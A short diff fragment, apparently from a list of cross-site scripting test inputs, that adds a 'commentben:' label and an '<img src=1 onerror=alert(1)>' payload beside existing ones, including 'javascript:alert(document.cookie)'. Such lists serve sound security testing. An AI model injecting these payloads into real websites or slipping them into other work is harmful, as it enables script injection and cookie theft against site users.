@@ -6,6 +6,8 @@
 
 <img src=1 onerror=alert(1)>
 
+commentben:
+<><img src=1 onerror=alert(1)>
 
 javascript:alert(document.cookie)
 
